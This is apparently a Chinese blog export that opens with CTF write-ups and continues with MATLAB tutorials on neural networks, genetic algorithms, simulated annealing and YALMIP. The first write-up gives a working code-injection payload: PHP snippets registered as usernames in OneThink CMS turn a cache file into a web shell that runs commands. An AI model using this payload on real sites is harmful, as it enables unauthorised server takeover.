    <content type="text"><![CDATA[A Simple CMS看到网站是OneThink做的，百度搜了下该CMS存在漏洞，参考文章过程即可得到flag。但是其中的缓存文件做了修改，需要在本地复现一下，确定缓存文件名。 0x00扫描网站敏感目录，发现www.zip文件： 0x01下载文件，在本地构建复现环境，首先删除onethink/onethink/Application/Install/Data/install.lock文件，然后访问install.php。 0x02依次使用%0a$a=$_GET[a];// 和 %0aecho &#96;$a&#96;;// 注册账号，在依次登录账号，发现存在Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php文件，且文件内容如下： 12345&lt;?php//000000000000a:4:&#123;s:2:"u1";s:13:"Administrator";s:2:"u3";s:6:"test12";s:2:"u4";s:15:"$a=$_GET[a];//";s:2:"u5";s:13:"echo `$a`;//";&#125;?&gt; 说明我们的一句话上传成功，文件名为Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php，该文件名不改变。 0x03在服务器上重复步骤2，getshell 在tmp目录下获取flag：1http://ddd27aa160354000ba7eba4b621e08cd9274bde410054da1.game.ichunqiu.com/Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php?a=cat%20/tmp/flag loli0x00图片下载下来，根据题目hint（0xFF），想到使用0xFF异或整个文件，脚本如下：1234567891011#!/usr/bin/env python# coding=utf-8def xor(): with open('./1.png', 'rb') as f, open('xor.png', 'wb') as wf: for each in f.read(): wf.write(chr(ord(each) ^ 0xff))if __name__ == '__main__': xor() 得到文件xor.png。 0x01使用二进制编辑器观察xor.png尾部，看到提示“black and white”，以及“IEND”标识，这是png的文件尾部，暗示该文件中隐藏了一个png文件。 使用 foremost 命令直接提取 （binwalk没卵用，感谢NaN师傅的提示Orz）：123foremost xor.pngls ./output/png|grep png00006777.png 0x02观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。 按上述思路提取该信息： 123456789101112131415161718192021222324252627282930import matplotlib.image as mpimg # mpimg 用于读取图片5:18# png[y][x][rgb]res_str = []res = []def readpng(): png = mpimg.imread('./out.png') yy, xx, depth = png.shape for y in range(yy): if y % 2 == 0: for x in range(1, xx - 1, 9): _str = "0b" + str(int(png[y][x][0])) + str(int(png[y][x + 1][0])) + str(int(png[y][x + 2][0])) + str(int(png[y][x + 3][0])) + str(int(png[y][x + 4][0])) + str(int(png[y][x + 5][0])) + str(int(png[y][x + 6][0])) + str(int(png[y][x + 7][0])) res_str.append(_str) res.append(bin2hex(_str)) print res_str with open('res.bin', 'wb') as f: for each in res: f.write(chr(each))def bin2hex(_bin="0b101"): return int(_bin, 2) ^ 0xFFif __name__ == '__main__': readpng() # bin2hex("0b101") 生成的res.bin实际为文本文件，打开即可看到flag：12cat res.binLet's look this lyrics:The black sky hangs down,The bright stars follow,The insect winged insect flies,Who are you missing,The space star bursts into tears,The ground rose withers,The cold wind blows the cold wind to blow,So long as has you to accompany,The insect fly rests,A pair of pair only then beautiful,Did not fear darkness only fears brokenheartedly,No matter is tired,Also no matter four cardinal points.Emmmm,It looks like you don't care about this lyrics. Well, this is flag:flag&#123;e0754197-e3ab-4d0d-b98f-96174c378a34&#125;Let's look this lyric]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[神经网络——数值分析问题的最后杀手锏]]></title>
    <url>%2F%E6%95%B0%E6%A8%A1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%E6%9D%80%E6%89%8B%E9%94%8F%2F</url>
    <content type="text"><![CDATA[我刚接触神经网络的那会它还没有像现在那么火热，当时我对它的效果很不屑，因为它在小样本的时候效果很差，但是到了研究生阶段再次遇到它的时候我对它有了新的认识，包括其内部的算法，有时间的话会另开一文再议，本文为16年我在数学建模中对神经网络算法的理解。 简介神经网络与之前的模拟退火,遗传算法并称为三大智能算法.但其与后两者的功能完全不同.他所解决的不是优化问题,而是类似于拟合,插值的问题.虽然其算法理论复杂,但是由于在MATLAB中的易于使用,所以也是处理数值分析问题的最后杀手锏. 使用神经网络只是一个一类算法的总称,下面我们演示其中一个最常见,也是最通用的一种—BP神经网络.例1:使用神经网络做x^2+y^2的插值 确定自变量为p行q列矩阵,p指实验次数,q指自变量个数: 123x1=[1:3:20]';x2=[1:3:20]';x=[x1,x2] 确定因变量为p行r列矩阵,p指实验次数,r指因变量个数: 1y=x1.^2+x2.^2 拷贝EzBp.m文件到当前目录,调用函数EzBP(x,y): 1[net,is,os]=EzBP(x,y); 若弹出神经网络的控制台,如: 表明成功. 测试结果.net表示学习完毕的神经网络,is方便我们对测试数据归一化,os方便我们将神经网络的返回的结果反归一化,得到我们的结果.现在我们用(11,11)测试一下(正确结果应该是11^2+11^2=242). 1234567testnum=[11,11]'%输入值归一化inputNum=mapminmax('apply',testNum,is);%放入神经网络,进行计算outputNum=net(inputNum);%将神经网络的值反归一化res=mapminmax('reverse',outputNum,os) 结果(你的可能跟我不一样): 12res = 245.5549 函数内部源码整个函数不难,结合一下流程图自己就能看懂. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function [net,ps,ts]=EzBP(P,T,x); % input x个体初始权值和阀值 % input P样本输入(n line,1 col) % input T样本输出(n line,1 col) % output net BP神经网络 % output ps 输入值归一化矩阵 % output ts 输出值归一化矩阵 nntwarn off %关闭警告 P=P'; T=T'; %数据预处理--归一化处理 [P,ps]=mapminmax(P); [T,ts]=mapminmax(T); [pr,pc]=size(P); [tr,tc]=size(T); %设置隐藏神经元个数,一般设置2*inputNum+1 inputNum=pr; outputNum=tr; hiddenNum=2*inputNum+1; %新建一个神经网络对象,这里采用tansig的激励算子,这个算子对非线性的插值计算效果较好 net=newff(minmax(P),[hiddenNum,outputNum],&#123;'tansig','tansig'&#125;); %隐含层 输出层 %设置神经网络训练的结束条件 net.trainParam.epochs=1e5; net.trainParam.goal=1e-5; net.trainParam.lr=0.05; net.trainParam.show=10; if nargin==3 net.trainParam.showwindow=false; w1num=inputNum*hiddenNum; w2num=outputNum*hiddenNum; w1=x(1:w1num); B1=x(w1num+1:w1num+hiddenNum); w2=x(w1num+hiddenNum+1:w1num+hiddenNum+w2num); B2=x(w1num+hiddenNum+w2num+1:w1num+hiddenNum+w2num+outputNum); net.iw&#123;1,1&#125;=reshape(w1,hiddenNum,inputNum); net.lw&#123;2,1&#125;=reshape(w2,outputNum,hiddenNum); net.b&#123;1&#125;=reshape(B1,hiddenNum,1); net.b&#123;2&#125;=reshape(B2,outputNum,1); end %训练 net=train(net,P,T);end 优化技巧神经网络的效果的好坏由(1)所选用的训练数据(2)神经元个数,(3)激励算子所决定.下面介绍一些简单的优化方法. 归一化,取典型值这是最简单的一种,归一化在EzBP函数里已经默认提供,说一下去典型值的意思: 举个例子,我们要拟合y=2*x,给的训练数据是x=1:10,y=2*x.那我把1.5放进去,出来的值很可能就是3.0±0.1的值,很靠谱吧?而我把100放进去,呵呵,那就不晓得是什么离谱的值了.现在知道什么叫典型的意思了吧.一般的,我们把每一变量的最大值和最低值放到网络中学习,而选用一部分中间的值作为验证. 12345678910111213141516function [train,test]=ChooseData(data) feature=[]; for eachCow=data [maxNum,maxPos]=max(eachCow); [minNum,minPos]=min(eachCow); feature=union(feature,maxPos); feature=union(feature,minPos); end dataNum=size(data,1); rand_=randperm(dataNum); needToChoose=floor(dataNum*0.9) train=union(feature,rand_(1:needToChoose)); test=rand_(needToChoose:end); train=data(train,:); test=data(test,:);end 交叉验证交叉验证是在训练数据比较少的情况下,增加训练数据的好方法.这里也给出简单的操作函数CvBP(x,y[,n]).n为可选参数,n越大训练数据会变得更多.但也不意味着训练结果会更好(过分学习的情况). demo.m: 123456789101112x1=[1:3:20]';x2=[1:3:20]';x=[x1,x2];y=x1.^2+x2.^2;net=CvBP(x,y,10);testNum=[11,11]';%放入神经网络,进行计算outputNum=net(testNum) CvBP.m: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function perfectNet=CvBP(P,T,num) pdata=P'; tdata=T'; pTrain=P; tTrain=T; n=10; %% 交叉验证 mse_max=10e30; desiredInput=[]; desiredOutput=[]; if nargin==2 num=5; end indices = crossvalind('Kfold',length(pTrain),num); for i = 1:num perfp=[]; disp(['The result of ',num2str(i),'/',num2str(num)]) test = (indices == i); trainA = ~test; pCvTrain=pTrain(trainA,:); tCvTrain=tTrain(trainA,:); pCvTest=pTrain(test,:); tCvTest=tTrain(test,:); pCvTrain=pCvTrain'; tCvTrain=tCvTrain'; pCvTest= pCvTest'; tCvTest= tCvTest'; nett=feedforwardnet(n); % net.trainParam.epochs=100000; % net.trainParam.show=200; % net.trainParam.goal=1e-4; % net=train(net,desired_input,desired_output); nett=train(nett,pCvTrain,tCvTrain); testOut=nett(pCvTest); perf=perform(nett,testOut,tCvTest); if mse_max&gt;perf perfectNet=nett; mse_max=perf; desiredInput=pCvTrain; desiredOutput=tCvTrain; end endend 结果: 12outputNum = 245.5549 与遗传算法结合还记得以前介绍的遗传算法嘛?注意到EzBP的第三个参数了嘛?没错,这就是给遗传算法准备的.其实,在初始化神经网络时,每个神经元都有一个初始的值[-0.5,0.5],如果用遗传算法对这个进行优化,就会对结果造成影响.(实际效果不好). demo.m: 12345678910111213141516x1=[1:3:20]';x2=[1:3:20]';x=[x1,x2];y=x1.^2+x2.^2;[net,is,os]=GABP(x,y);testNum=[11,11]';%输入值归一化inputNum=mapminmax('apply',testNum,is);%放入神经网络,进行计算outputNum=net(inputNum);%将神经网络的值反归一化res=mapminmax('reverse',outputNum,os) GABP.m: 123456789101112131415161718function [net,ps,ts,perf]=GABP(P,T) inputNum=size(P,2); outputNum=size(T,2); P_T=[P T]; [train,test]=ChooseData(P_T); trainX=train(:,1:inputNum); trainY=train(:,inputNum+1:end); testX=test(:,1:inputNum); testY=test(:,inputNum+1:end); hiddenNum=2*inputNum+1; w1num=inputNum*hiddenNum; w2num=outputNum*hiddenNum; N=w1num+hiddenNum+w2num+outputNum; bound=repmat([-0.5 0.5],N,1); [best,x]=EzGA(bound,@fun,20,&#123;trainX,trainY,testX,testY&#125;); [net,ps,ts,perf]=EzBP(trainX,trainY,x,testX,testY);end 总结神经网络算法是一套历史悠久也比较成熟的机器学习算法.是对付数值分析问题的最后杀手锏.我们一般比较常用的一种神经网络是BP神经网络.本文也以BP神经网络的使用及其优化进行了详细讲解,同时提供了可调用的函数原型.但想要得到较好效果,还建议学习其他的一些神经网络,了解其各自优势.但由于这一类算法普遍稳定性较差,如果不是万不得已,或是效果超群,不建议使用.同时,若要使用此算法,请务必抽出一部分样本用来检验(严禁拿结果直接来学习,然后返回结果!!) 其算法优劣分析如下(笔者认为):优点: 所适用的类型广泛.如果优化的好,几乎可以解决比赛中遇到的各种问题.e.g.插值,拟合,聚类. 对非线性数据的拟合效果优异.实在没看出数据有啥规律,神经网络至少算是一种解决方法. 缺点: 需要大量的样本数据 源程序: https://github.com/Anemone95/matlab-nnet]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>人工智能</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[遗传算法——另一个求最优解的智能算法]]></title>
    <url>%2F%E6%95%B0%E6%A8%A1-%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%B1%82%E6%9C%80%E4%BC%98%E8%A7%A3%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[遗传算法是求解近似最优解的最具代表性的智能算法之一，如今的很多方法都可以看到它的影子，比如说之前在研究的基于覆盖率的fuzz测试，其中的输入变异就类似于遗传算法，故从旧博客搬运来。 简介遗传算法在外部体现同模拟退火一样,也是属于优化问题的一个求解器.但由于其优异的收敛速度和比模拟退火更优秀的结果,在对结果要求高的题目上,它也成为我们求解问题的常用方法. 快速使用遗传算法在实现上比模拟退火要复杂很多,但若不关心其内部算法,使用上反而比模拟退火要简单. 连续型随机变量案例一:求min(x^2+y^2),x,y∈[-1e5,1e5]: 复制GANorm文件夹到你的工作目录. 同文件夹下新建demo.m文件,输入: 12y=@(x)x(1)^2+x(2)^2;[best,x]=EzGA([-1e5 1e5;-1e5 1e5],y) 运行demo.m文件,得到从运行及结果: 123456sizepop = 1000best = 3.9901x = 1.9975 -0.0001 没错,简单的遗传算法函数的调用形式为EzGA(变量上下限,目标函数句柄[,初始种群数量=500,附加数据]),注意第三个,第四个变量为可选参数. 案例二:求min(0.7*x(1)+0.8*x(2)),x,y∈[-1e5,1e5]: 复制GANorm文件夹到你的工作目录. 同文件夹下新建demo2.m文件,输入: 1[best,x]=EzGA([-1e5 1e5;-1e5 1e5],@OptFun,1e2,[0.7 0.8]) 同文件夹下新建OptFun.m文件,输入: 123function y=OptFun(x,coe) y=coe(1)*x(1)^2+coe(2)*x(2)^2;end 运行demo2.m文件,得到从运行及结果: 1234567sizepop = 100best = 1.1761e-07x = 1.0e-03 * -0.0079 0.3834 原理讲解以下结合案例,来解释一下遗传算法的具体实现. 连续型随机变量(TSP问题)下面又是我们的旅行商问题,同样,我们有图(*代表城镇): 首先,结合流程图,我们首先写主函数调用遗传算法GATSP12345678910111213141516171819%记录了城镇的坐标X=[16.47,96.1016.47,94.4420.09,92.5422.39,93.3725.23,97.2422.00,96.0520.47,97.0217.29,96.2916.30,97.3814.05,98.1216.53,97.3821.52,95.5920.09,92.55];D=Distance(X); %取得邻接矩阵N=size(D,1); %城镇数%调用遗传算法[obj,x]=GATSP(N,D); 遗传算法主函数:12345678910111213141516171819202122232425262728293031323334353637383940414243444546function [minObj,x]=GATSP(N,attach,NIND) MAXGEN=200; if nargin&lt;3 NIND=100; end Pc=0.9; Pm=0.2; GGAP=0.9; Chrom=InitPop(NIND,N); % Rlength=PathLength(D,Chrom(1,:)); gen=0; % ObjV=PathLength(D,Chrom); % preObjV=min(ObjV); history=[]; h=waitbar(0,'Evolving....'); while gen&lt;MAXGEN ObjV=PathLength(attach,Chrom); % min(ObjV) FitnV=Fitness(ObjV); SelCh=Select(Chrom,FitnV,GGAP); SelCh=Recombin(SelCh,Pc); SelCh=Mutate(SelCh,Pm); SelCh=Reverse(SelCh,attach); Chrom=Reins(Chrom,SelCh,ObjV); history=[history min(ObjV)]; gen=gen+1; waitbar(gen/MAXGEN,h,sprintf('Now Generation:%d',gen)); if gen&gt;30 if sum(diff(history(end-30:end)))==0 break end end end close(h) ObjV=PathLength(attach,Chrom); plot(history) title('Fitness curve','fontsize',12); xlabel('Evolutionary generation','fontsize',12);ylabel('Option','fontsize',12); % axis([0,MAXGEN,0,1]) [minObj,minInd]=min(ObjV); x=Chrom(minInd,:);end 初始化种群初始化种群实际就是产生NIND个符合要求的解.InitPop.m:12345678function Chrom=InitPop(NIND,N) %NIND 种群大小 %N 单个染色体长度(城市个数) Chrom=zeros(NIND,N); for i=1:NIND Chrom(i,:)=randperm(N); %随机产生种群 endend 适应度函数TSP的要求是路程最短,而适应度函数视值越大越优,所以我们这里先计算出长度后,再对其取反. PathLength.m:123456789101112function len=PathLength(graph,Chrom) [row,col]=size(graph); NIND=size(Chrom,1); len=zeros(NIND,1); for i=1:NIND % path p=[Chrom(i,:) Chrom(i,1)]; i1=p(1:end-1); i2=p(2:end); len(i,1)=sum(graph((i1-1)*col+i2));% ∑graph(from,to) endend Fitness.m:1234function FitnV=Fitness(len) % len 个体长度 FitnV=1./len;end 选择操作模拟自然选择,实际上就是指适应度越好的解被留下来的几率越大(但也不是说适应度不好的解不被留下).1234567891011121314151617181920function SelCh=Select(Chrom,FitnV,GGAP) %种群 适应值 选择概率 被选择个体 NIND=size(Chrom,1); NSel=max(floor(NIND*GGAP+0.5),2); Chrlx=Sus(FitnV,NSel); SelCh=Chrom(Chrlx,:);endfunction NewChrlx=Sus(FitnV,NSel) %适应值 数目 %备选索引 [Nind,ans_]=size(FitnV); cumfit=cumsum(FitnV); trials=cumfit(Nind)/NSel*(rand+(0:NSel-1)'); Mf=cumfit(:,ones(1,NSel)); Mt=trials(:,ones(1,Nind))'; [NewChrlx,ans_]=find(Mt&lt;Mf&amp;[zeros(1,NSel);Mf(1:Nind-1,:)]&lt;=Mt); [ans_,shuf]=sort(rand(NSel,1)); NewChrlx=NewChrlx(shuf);end 交叉操作模拟染色体的交叉现象,注意在这里会出现城市出现重复的现象,需要用部分映射的方法消除冲突(介于篇幅不赘述,但我就记得这问题我想了一下午,然后一个数科院的妹子3分钟搞定了.顿时就感觉!!).原先的两个解:123| 9, 5, 1| 3, 7, 4, 2| 10, 8, 6||--------|-----------|---------||10, 5, 4| 6, 3, 8, 7| 2, 1, 9| 交叉123| 9, 5, 1| 6, 3, 8, 7| 10, *, *||--------|-----------|---------||10, 5, *| 3, 7, 4, 2| *, 1, 9| 部分映射123| 9, 5, 1| 6, 3, 8, 7| 10, 4, 2||--------|-----------|---------||10, 5, 8| 3, 7, 4, 2| 6, 1, 9| Recombin.m:123456789101112131415161718192021222324252627282930313233343536function SelCh=Recombin(SelCh,Pc) %被选择个体 概率 %交叉后个体 NSel=size(SelCh,1); for i=1:2:NSel-mod(NSel,2) if Pc&gt;=rand [SelCh(i,:),SelCh(i+1,:)]=intercross(SelCh(i,:),SelCh(i+1,:)); end endendfunction [a,b]=intercross(a,b) L=length(a); r1=randsrc(1,1,[1,L]); r2=randsrc(1,1,[1,L]); if r1~=r2 a0=a;b0=b; s=min([r1,r2]); e=max([r1,r2]); for i=s:e a1=a;b1=b; a(i)=b0(i); b(i)=a0(i); x=find(a==a(i)); y=find(b==b(i)); i1=x(x~=i); i2=y(y~=i); if ~isempty(i1) a(i1)=a1(i); end if ~isempty(i2) b(i2)=b1(i); end end endend 变异操作模拟染色体的变异现象,这里的算子就是两个随机位置上的数交换12| 9, 5, 1| 3, 7, 4, 2| 10, 8, 6|| 9, 5, 2| 3, 7, 4, 1| 10, 8, 6| Mutate.m:12345678910function SelCh=Mutate(SelCh,Pm) %个体 概率 [NSel,L]=size(SelCh); for i=1:NSel if Pm&gt;=rand R=randperm(L); SelCh(i,R(1:2))=SelCh(i,R(2:-1:1)); end endend 重组就是把经过选择,交叉,变异的解与旧解混合,保证种群内个体数不变.123456function Chrom=Reins(Chrom,SelCh,ObjV) NIND=size(Chrom,1); NSel=size(SelCh,1); [TobjV,index]=sort(ObjV); Chrom=[Chrom(index(1:NIND-NSel),:);SelCh];end 反转(不必要掌握)反转操作是针对TSP问题对于局部的一种优化,本身不在遗传算法范围内.这里给出算法代码.123456789101112131415function SelCh=Reverse(SelCh,D) [row,col]=size(SelCh); ObjV=PathLength(D,SelCh); SelCh1=SelCh; for i=1:row r1=randsrc(1,1,[1:col]); r2=randsrc(1,1,[1:col]); mininverse=min([r1 r2]); maxinverse=max([r1 r2]); SelCh1(i,mininverse:maxinverse)=SelCh1(i,maxinverse:-1:mininverse); end ObjV1=PathLength(D,SelCh1); index=ObjV1&lt;ObjV; SelCh(index,:)=SelCh1(index,:);end 小结遗传算法是一个模拟生物遗传进化的,比较成熟的大型智能算法.采用设计好的算子,可以解决大部分类型的规划问题.但由于其算法较为复杂,在比赛中没有充分把握还是要谨慎使用.本文借助三个案例,大致介绍了遗传算法的工作原理,同时对两大典型的规划问题给出了简单可调用的函数原型.方便大家学习使用.同时,遗传算法的优劣总结如下(个人观点): 优点 相对于新型的智能算法,如:粒子群算法,蚁群算法.他更加成熟稳定.这表现在可适用的问题类型众多(蚁群不能算TSP). 相对于模拟退火算法,它不用给出初始值和重组解的方式,而是交给算法本身完成.使用时只需给定目标函数和解的限制条件. 相对于模拟退火,它有更优秀的收敛时间,可控的时间复杂度.并在连续型随机变量上有明显优势. 相对于传统算法,有一定的定制空间,自己定制的目标函数能适用于matlab的各种函数(包括给神经网络做优化). 缺点 相对于新型智能算法,它收敛速度和结果差强人意. 相对于能够定制解的模拟退火,遗传算法不够灵活. 整体算法实现复杂,且由于算子众多,学习成本大.若在比赛中不能将问题转化成文中介绍的两种类型,不建议使用该算法. 参考书籍:《MATLAB智能算法30个案例分析》程序下载: https://github.com/Anemone95/matlab-GA]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模拟退火——史上最简单的智能算法]]></title>
    <url>%2F%E6%95%B0%E6%A8%A1-%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E2%80%94%E2%80%94%E5%8F%B2%E4%B8%8A%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[一篇很久之前写的文章了，不过过了这么多年，模拟退火由于其效果和实现简单的优势，依然是智能算法中一个比较热门的算法，故老博客搬运而来。 简介模拟退火算法从外部来看就是一个优化问题的解析器,我们给他传递初始解和产生新解的方法,它就能不断产生新解,并比较最终返回一个近似最优解.由于数学建模对算法的时间限制不严,而模拟退火又较易于实现,因此它也是数学建模里较常用的一种智能算法. 快速使用在介绍具体算法前,我们完全可以在短时间内使用上模拟退火. 例1:求min(x^2+y^2),x,y∈R. 首先,我们提供一个初始解.文件main.m. 1x=[2,2]; 其次,构造出一个评价函数(或称目标函数).文件OptFun.m. 123function y=OptFun(x) y=x(1)^2+x(2)^2;end 接着,构造一个能够不断根据旧解产生新解的函数.这里我们根据旧解以正态随机函数的形式产生新解.文件Arrise.m. 1234function X=Arrise(x) X(1)=normrnd(x(1),2); X(2)=normrnd(x(2),2);end 复制EzSA.m到文件夹. 最后,调用现成的模拟退火函数EzSA.文件main.m. 1[ x,res ]=EzSA(x,@myFirstSA,@Arrise) 如果你看到一个进度条,那么恭喜你,你已经会使用模拟退火算法了! 让我们看看结果: 图像记载了我们之前尝试的解值,可以看出在数次迭代后数值处于稳定状态,表示这次模拟退火算法成功了. 同时,x 返回较优解,res返回较优值. 1234x = -0.0035 -0.0027res = 1.9562e-05 让我们总结一下模拟退火函数的使用步骤: 提供或初始化一个初始解. 构造出一个评价函数(或称目标函数),该函数接收解,并返回一个数值(视值越小解越优). 构造一个能够不断根据旧解产生新解的函数(注意,这个函数的设计优劣直接影响到模拟退火效果的好坏). 调用现成的模拟退火函数EzSA(初始解,评价函数句柄,产生新解函数句柄). 一段时间后模拟退火算法结束,返回较优解和解值 例2:旅行商问题(TSP)现有五个城市,彼此间距离如图所示,现在旅行商需要经过所有城市一次并回到出发点.我们需要为他规划最短路线. 首先,以邻接矩阵存储图并提供初始解.文件main.m. 123456global n %n为城市数,由于在无法将n以参数形式传递给计算距离的函数,故声明为全局变量global graph %同上n=5;graph=[0,7,6,1,3;7,0,3,7,8;6,3,0,12,11;1,7,12,0,2;3,8,11,2,0];city=1:5; %初始解 其次是评价函数,设city为五个城市的访问顺序.文件computerTour.m. 123456789function len=computerTour(city) %计算路线总长度，每个城市只计算和下家城市之间的距离。 global n %获取n为城市数 global graph len=0; for i=1:n-1 len=len+graph(city(i),city(i+1)); end len=len+graph(city(n),city(1));end 接着,根据旧解产生新解的函数.文件perturbTour.m. 12345678910function city=perturbTour(city) %随机置换两个不同的城市的坐标 %产生随机扰动 global n p1=randi([1,n]); p2=randi([1,n]); tmp=city(p1); city(p1)=city(p2); city(p2)=tmp;end 最后,调用模拟退火函数(与第一步写在同一文件),并运行.文件main.m 1[city,res]=EzSA(city,@computerTour,@perturbTour) 结果: 1234city = 4 1 3 2 5res = 20 原理讲解源代码:123456789101112131415161718192021222324252627282930313233343536function [X resEnd]=EzSA(X,ObjFun,ArriseNew,iter,zero) [ra,co]=size(X); RES=[ObjFun(X)]; %每次迭代后的结果 temperature=100*co; %初始温度 if nargin==3 zero=1e-2; iter=5e2; %内部蒙特卡洛循环迭代次数 end if nargin==4 zero=1e-2; end h=waitbar(0,'SAing....'); while temperature&gt;zero %停止迭代温度 for i=1:iter %多次迭代扰动，一种蒙特卡洛方法，温度降低之前多次实验 preRes=ObjFun(X); %目标函数计算结果 tmpX=ArriseNew(X); %产生随机扰动 newRes=ObjFun(tmpX); %计算新结果 delta_e=newRes-preRes; %新老结果的差值，相当于能量 if delta_e&lt;0 %新结果好于旧结果，用新路线代替旧路线 X=tmpX; else %温度越低，越不太可能接受新解；新老距离差值越大，越不太可能接受新解 if exp(-delta_e/temperature)&gt;rand() %以概率选择是否接受新解 p=exp(-ΔE/T) X=tmpX; %可能得到较差的解 end end end RES=[RES ObjFun(X)]; temperature=temperature*0.99; %温度不断下降 waitbar((log(temperature/(100*co))/log(0.99))/(log(zero/(100*co))/log(0.99)),h,sprintf('Now Temperature:%.2f',temperature)); end close(h) plot(RES); resEnd=RES(end);end 结合代码再看开头的流程图. 初始化,计算初始解的解值,设置初始温度.模拟退火结构上就是两重循环,外部循环检查温度并降温,内部不断地产生新解并与旧解比较. 若新解优于旧解则新解无条件被旧解替代.否则,有一定概率(exp(-ΔE/T))新解取代旧解.注意这个环节正是模拟退火能跳脱局部最优解,取得全局最优解的关键. 由此,我们可以得知影响模拟退火效果的主要因素有: 终止温度.一般上,终止温度越低,取得解越优. 内部迭代次数.一般上,内部迭代次数越多,取得解越优. 产生新解函数. 总结模拟退火是对热力学退火过程的模拟,使算法在多项式时间内能给出一个近似最优解.由于MATLAB自带的模拟退火工具箱调用复杂且执行效果不理想,本文给出了较简单的函数原型和调用方法.该算法也包含以下优缺点(个人见解): 优点: 相较于一般的蒙特卡洛算法,有更少的尝试次数,同时实现上并不比蒙特卡洛花更多时间. 相较于遗传算法等大型智能算法,模拟退火实现简单,并能返回较满意的结果. 目标函数可以自己定制,相较于普通的规划解析器,模拟退火能适用于更广的范围(NPC问题,甚至给给神经网络做优化). 对于离散型的变量有更优秀的效果. 缺点: 内部本质上还是蒙特卡洛算法,新解与旧解本质上无关联. 相较于遗传算法,模拟退火难以控制算法的运行时间,EzSA的后面两个可选参数就是内部迭代次数和0度温度.而迭代次数给少了效果不理想,给多了有会增加等待时间. 对连续型的规划问题效果并不好. 样例和函数原型下载:https://github.com/Anemone95/matlab-sa]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[YALMIP工具箱——Matlab上解决规划问题的大杀器]]></title>
    <url>%2F%E6%95%B0%E6%A8%A1-YALMIP%E5%B7%A5%E5%85%B7%E7%AE%B1%E2%80%94%E2%80%94Matlab%E4%B8%8A%E8%A7%A3%E5%86%B3%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%A7%E6%9D%80%E5%99%A8%2F</url>
    <content type="text"><![CDATA[数学建模过去很多年了，但是YALMIP工具箱的易用性仍然让我影响深刻，用过这个之后再想想现在用的z3约束求解真的是弱爆了，什么时候Python上面能有一个那么好用的规划工具就好了&gt;_&lt; 简介规划问题可以算是数模竞赛常见的问题(作为信工院的小白,实在佩服数科院的牛人们能把任何问题搞成优化问题).由于MATLAB自带的规划工具箱并不好用,部分同学不得不用Lingo等软件专门解决规划问题,但Lingo的语法可读性并没有matlab好.YALMIP解决了这个问题. 简单来说,YALMIP是一个MATLAB上的一个工具箱.它让你用MATLAB语法优雅地解决各种规化问题.(MATLAB的函数都能用，妈妈再也不用担心我的学习orz) 往细了说,它将优化问题进行分类,在底层通过B/S模式调用外部的各种解析器(每一解析器可以对应一类或多类问题,如Lingo的解析器Lindo就在其中),而在外部,你不需要了解各种解析器的具体语法,只需掌握YALMIP的语法就可轻松的调用他们.由此解决大多数规划问题. 安装 确保MATLAB版本在2015a及以上. 点击此处下载zip安装包,随后解压到MATLAB目录下,如果你的MATLAB安装在默认目录下,那么结果如下: 将YALMIP的目录加入到MATLAB的PATH中,其中包括: 验证YALMIP的安装工作 在MATLAB中输入yalmiptest,若出现 123456789101112+++++++++++++++++++++++++++++++++++++++++++++++| Searching for installed solvers |+++++++++++++++++++++++++++++++++++++++++++++++| Solver| Version/module| Status|+++++++++++++++++++++++++++++++++++++++++++++++| LINPROG| | found|| QUADPROG| | found|| LMILAB| | found|| FMINCON| geometric| found|| ....... || FRLIB| | not found|+++++++++++++++++++++++++++++++++++++++++++++++ 那么恭喜你,YALMIP安装成功! 安装基础的解析器 细心的朋友应该发现了,当我们执行yalmiptest时,实际上是检查可使用的解析器.下面就介绍一些常用的解析器以及安装 Gurobi/CPLEX:Gurobi和CPLEX适用的范围差不多,所以上只要装一个就行.性能的话还是CPLEX会好一点(毕竟IBM,但差别不大),两者都有针对学术的免费版本,CPLEX学术版本的获取需要以教师身份注册,而Gurobi是需要教育网IP验证.同时Gurobi还有免费的社区版本(半年).各版本的区别都在于支持的变量数上,然而Gurobi的社区版本个人以为完全可以满足国赛的需要了(超了那个数量自己想想思路有没有问题). 以下是Gurobi的安装流程. 先到Gurobi官网上注册账号. 申请对应版本的序列号. 下载对应版本Gurobi,安装后重启. Win+R运行cmd回车后 输入激活码grbgetkey xxx-xxx-xxx-xxx. 在MATLAB下运行Gurobi/win/matlab/gurobi_setup.m 同时保存PATHsavepath 在运行yalmiptest应该看到Gurobi变成found了. 当然,如果你确实需要一个支持大量变量的解析器,那么你只能用mosek了,只需要edu邮箱验证,然而解题速度会慢很多. 基本使用 设未知量 1x = sdpvar(n,m); %生成a行b列的未知量 之前也说过YALMIP的未知量有3中类型.分别为 sdpvar %实型 intvar %整型 binvar %0-1型需要混合规划多设几个变量就行了 约束条件, 